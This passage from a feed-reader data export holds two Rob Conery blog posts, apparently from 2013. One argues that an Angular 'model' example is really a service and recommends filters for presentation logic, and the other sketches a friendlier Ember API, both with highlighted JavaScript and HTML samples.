class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"nx\">Author</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">}),</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"nx\">Author</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>So far, so good. Unfortunately I think some confusion crept in - here is the full example of Joel's code for his authorListModel:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s1\">'modelDemo'</span><span class=\"p\">).</span><span class=\"nx\">service</span><span class=\"p\">(</span><span class=\"s2\">\"authorListModel\"</span><span class=\"p\">,</span><span class=\"p\">[</span><span class=\"s1\">'$rootScope'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$rootScope</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"c1\">//...</span></span><span class='line'></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"nx\">fowler</span><span class=\"p\">,</span><span class=\"nx\">twain</span><span class=\"p\">,</span><span class=\"nx\">poe</span><span class=\"p\">,</span><span class=\"nx\">plato</span><span class=\"p\">];</span></span><span class='line'></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"kc\">null</span><span class=\"p\">;</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">setSelectedAuthor</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"o\">&gt;</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">;</span></span><span class='line'><span class=\"nx\">$rootScope</span><span class=\"p\">.</span><span class=\"nx\">$broadcast</span><span class=\"p\">(</span><span class=\"s1\">'authorModel::selectedAuthorUpdated'</span><span class=\"p\">,</span><span class=\"nx\">author</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'><span class=\"p\">}]);</span></span></code></pre></td></tr></table></div></figure><p>In the first line we've told Angular that this function is to be used a Service. Services in Angular are Singletons - which can cause all kinds of interesting headaches if you treat that service as a Model.</p><p>In Joel's case there's nothing wrong with the code here - except that it's not a Model -<strong>it's a Service</strong>and before you think I'm nitpicking -<strong>Service, in Angular, has a very particular reason for existence</strong>and it's not this:</p><blockquote><p>... the “M” in MVC, model classes encapsulate your application’s data and provide an API to access and manipulate that data. The other classes in your application will make requests of models via this API. When data on the model is updated, the model dispatches events that the other classes within your application can react to.</p></blockquote><p>The definition is a good one - unfortunately the code that is being offered to support the definition is actually a Service, not a Model.</p><h2>So What About a Model?</h2><p>I get asked this a fair amount and my answer is typically:</p><blockquote><p>Your model lives on the server</p></blockquote><p><i>hat-tip to Steve Sanderson for this</i></p><p>This works in many ways: it frees you from duplicating code on the client and it keeps secret things secret (such as applying discounts to a shopping cart, etc).</p><p>But what about behavior on individual bits of data? Here's where things get interesting with Angular.</p><p>Let's say you use Angular's $resource to hook up to an Author resource in the sky somewhere:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">app</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"authorApp\"</span><span class=\"p\">,</span><span class=\"p\">[]);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">api</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$resource</span><span class=\"p\">){</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">$resource</span><span class=\"p\">(</span><span class=\"s2\">\"/authors\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">service</span><span class=\"p\">(</span><span class=\"s2\">\"Api\"</span><span class=\"p\">,</span><span class=\"nx\">api</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>You can use this in your controller like so:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">controller</span><span class=\"p\">(</span><span class=\"s2\">\"AuthorCtrl\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">,</span><span class=\"nx\">Api</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"c1\">//returns [{first :'Mark', last :'Twain', quote :'...'}]</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">Api</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>That will send a GET request off to\"/authors\" and return a promise that will provide some data on success. Angular works really well with promises so there's no more code to be written here - when the data shows up, it hits the $scope which is\"bound\" to the UI through ng-repeat and off we go.</p><p>But how can we use our Author prototype above? A number of ways - let's go through this...</p><p>The first way is to get away from using\"service\" and have a bit more structure with a factory:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">app</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"authorApp\"</span><span class=\"p\">,</span><span class=\"p\">[]);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">api</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$resource</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">authorResource</span><span class=\"o\">=</span><span class=\"nx\">$resource</span><span class=\"p\">(</span><span class=\"s2\">\"/authors\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">queryAuthors</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">next</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//use a callback instead of a promise</span></span><span class='line'><span class=\"nx\">authorResource</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">({},</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">){</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">out</span><span class=\"o\">=</span><span class=\"p\">[];</span></span><span class='line'><span class=\"c1\">//Underscore's\"each\" method</span></span><span class='line'><span class=\"nx\">_</span><span class=\"p\">.</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//using our Author prototype above</span></span><span class='line'><span class=\"nx\">out</span><span class=\"p\">.</span><span class=\"nx\">push</span><span class=\"p\">(</span><span class=\"nx\">Author</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">));</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"nx\">next</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"k\">return</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">authors</span><span class=\"o\">:</span><span class=\"nx\">queryAuthors</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">factory</span><span class=\"p\">(</span><span class=\"s2\">\"Api\"</span><span class=\"p\">,</span><span class=\"nx\">api</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>A bit more code... but either way we can use it this way:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">controller</span><span class=\"p\">(</span><span class=\"s2\">\"AuthorCtrl\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">,</span><span class=\"nx\">Api</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"c1\">//returns [{first :'Mark', last :'Twain', quote :'...'}]</span></span><span class='line'><span class=\"nx\">Api</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">results</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now we have a nice array of Authors. But we've also bent Angular just a bit because we're thinking like Software Developers - expecting\"behavior\" like\"fullName()\" to be on our model.</p><p>If we take a step back and consider what we're doing here (instrumenting the UI) - that doesn't make all that much sense. Here's where Joel and I will increase our disagreement :) and maybe you'll think I'm a dope.</p><h2>Domain vs. Presentation Concerns</h2><p>What is the motive for using the Author prototype? Typically, when working with Single Page Applications it's something that relates to:</p><ul><li>Code Reuse (Author might be reusable around the app)</li><li>Centralized Logic (fullName(), daysUntilBirthday())</li></ul><p>I'm going to put forward a bit of a strong opinion:<strong>if it's not presentation-related, it doesn't belong here</strong>. Hopefully we can agree on this as, well, the page is all about presentation and while yes there's logic flying around - it's presentation logic!</p><p>Angular provides a better facility for this kind of thing:<strong>they're called filters</strong>. In Angular we can do this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fullNameFilter</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">person</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//you can have some logic in here to introspect\"person\"</span></span><span class='line'><span class=\"c1\">//for\"first\" or\"firstName\" or whatever</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">person</span><span class=\"p\">.</span><span class=\"nx\">first</span><span class=\"o\">+</span><span class=\"s2\">\"\"</span><span class=\"o\">+</span><span class=\"nx\">person</span><span class=\"p\">.</span><span class=\"nx\">last</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"c1\">//add it to the app</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">filter</span><span class=\"p\">(</span><span class=\"s2\">\"fullname\"</span><span class=\"p\">,</span><span class=\"nx\">fullNameFilter</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>In your code you can now ask for the full name like this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">\"author in authors\"</span><span class=\"nt\">&gt;</span>{{ author | fullname}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span></code></pre></td></tr></table></div></figure><p>The really nice thing about this is that you can reuse these filters - in any project! Turning this back to Joel's post - can we solve the problem without introducing a new model/service?</p><p>I think so. In looking at the controller code that Joel wants to refactor, we see this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"nx\">twain</span><span class=\"p\">,</span><span class=\"nx\">fowler</span><span class=\"p\">,</span><span class=\"nx\">poe</span><span class=\"p\">,</span><span class=\"nx\">plato</span><span class=\"p\">];</span></span><span class='line'></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectQuote</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedQuote</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">.</span><span class=\"nx\">quote</span><span class=\"p\">;</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">isSelected</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">author</span><span class=\"o\">===</span><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>I can guess as to a few reasons why it exists - but I don't think it's going out on a limb to think Joel wants to indicate visually which author the user wants to know more about.</p><p>There are a number of ways to solve this - from drop dead simple:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">\"author in authors\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"c\">&lt;!--select the author, then set the class or whatever is needed. Yay dynamic languages!--&gt;</span></span><span class='line'><span class=\"nt\">&lt;input</span><span class=\"na\">type=</span><span class=\"s\">'checkbox'</span><span class=\"na\">ng-model=</span><span class=\"s\">'author.selected'</span><span class=\"nt\">&gt;</span></span><span class='line'>{{fullname | author}}</span><span class='line'><span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span></code></pre></td></tr></table></div></figure><p>To a more advanced solution involving directives (which I'll sidestep for now - this post is long enough). My ultimate point is that we're in presentation land here and while it's tempting to put your engineering muscle to work, there's just no need.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=VvpPVADxNBA:TBLWnc4G7rk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=VvpPVADxNBA:TBLWnc4G7rk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/VvpPVADxNBA\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1123}}
{"k":"0000000084","o":"0000015231","v":"001"}
{"_id":1124,"_uid":1124,"_dt":1373742620936,"_s":"ac9a5ed89c2e7e27eb30eda952613cbf"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/rEbegmNcGV8/ember-what-if-part-1","title":"Ember... What If (Part 1)","published":{"$wrap":"$date","v":1364050800000,"h":"2013-03-23T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>The Ember guys are having a hard week. I promised Tom Dale I'd try and help by \"arm-waving\" an API together that I feel expresses a bit more about the main ideas behind Ember. It's Friday, I've had a beer or two... but I got inspired...</p><p><img src='http://wekeroad.com/images/thinker.jpg'/></p><p><p><em>image from<a href=\"http://therustyshield.wordpress.com/2011/09/02/breakfast-topic-how-long-do-you-take-to-create-a-character/thinker/\">The Rusty Shield</a></em></p><h2>Hello There!</h2><p>Setting a happy tone immediately is job one, in my mind. When you add Ember to a page you want to know it's there, and it's ready for you. Moreover you want to get going writing some code!</p><p>Right now you're stopped immediately with script warnings about including Handlebars and jQuery (if you don't have them installed). Can we make that experience better?</p><p>Yes. Bundle them! Angular bundles jQlite, Ember should bundle Handlebars and the same library. If they can't do that (for whatever reason):<strong>tell me</strong>(using console.log):</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class=''><span class='line'>Ember needs Handlebars and jQuery to run! You can download them directly or just use add these tags above the ember.js script tag:</span><span class='line'>&lt;script src=\"http://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.0.0-rc.3/handlebars.min.js\"&lt;/script&gt;</span><span class='line'>&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure><p>How nice is that! I still like the idea of bundling, however.</p><h2>Default App.</h2><p>Ember is all about convention. Convention with naming, with various objects following MVC - what if we flexed that even more.</p><p>The assumption is this:</p><blockquote><p>If you include Ember, you want to build a Javascript application</p></blockquote><p>I think that's a pretty solid assumption. So let's turn this around - instead of writing this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">()</span></span></code></pre></td></tr></table></div></figure><p>Just make\"App\" exist already! We know that jQuery is a dependency - so go with it and load that statement up by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//Part of Ember.js</span></span><span class='line'><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">bootstrap</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This can be overriden (which keeps in the spirit of Ember) in a new method<code>Ember.bootstrap</code>:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">bootstrap</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">app</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">Tekpub</span><span class=\"p\">.</span><span class=\"nx\">MyApp</span><span class=\"o\">=</span><span class=\"nx\">app</span><span class=\"p\">;</span></span><span class='line'><span class=\"c1\">//config etc.</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>For me, 9 times out of 10 I'll just work with\"App\". No need to change things in my mind and if you need to - just run<code>App.config(function(app){})\"</code>and change things in<code>$(document).ready()</code>.</p><h2>That Naming Thing</h2><p>Right now there are a lot of concepts that hang loosely from a naming scheme. This is a double-whammy that I think makes Ember hard to use.</p><p>What if we reversed this entirely? What if we defined the\"name\" up front? Here's what the Index definition would be (it could easily be\"Post\" or something else):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span><span class='line-number'>22</span><span class='line-number'>23</span><span class='line-number'>24</span><span class='line-number'>25</span><span class='line-number'>26</span><span class='line-number'>27</span><span class='line-number'>28</span><span class='line-number'>29</span><span class='line-number'>30</span><span class='line-number'>31</span><span class='line-number'>32</span><span class='line-number'>33</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Index</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//wrap the notion of an Index in a\"Definition\" object</span></span><span class='line'><span class=\"c1\">//this is clean, and in one place</span></span><span class='line'><span class=\"c1\">//the naming concerns are implied</span></span><span class='line'><span class=\"k\">return</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//all of the below is optional</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//this is an Ember.Data thing</span></span><span class='line'><span class=\"c1\">//or I can override some methods using</span></span><span class='line'><span class=\"c1\">//my own Ajax stuff with jQuery</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">routes</span><span class=\"o\">:</span><span class=\"p\">[</span></span><span class='line'><span class=\"s2\">\"/:thingy\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"/stuff\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"another-override\"</span></span><span class='line'><span class=\"p\">],</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">model</span><span class=\"p\">,</span><span class=\"nx\">routeParameters</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//route params are available via route.thingy, etc</span></span><span class='line'><span class=\"c1\">//this function is optional and exists for you</span></span><span class='line'><span class=\"c1\">//created by Ember</span></span><span class='line'><span class=\"c1\">//this method is available in my view</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">posts</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//fetch from the model and return the result</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"c1\">//another...</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">comments</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"c1\">//etc</span></span><span class='line'><span 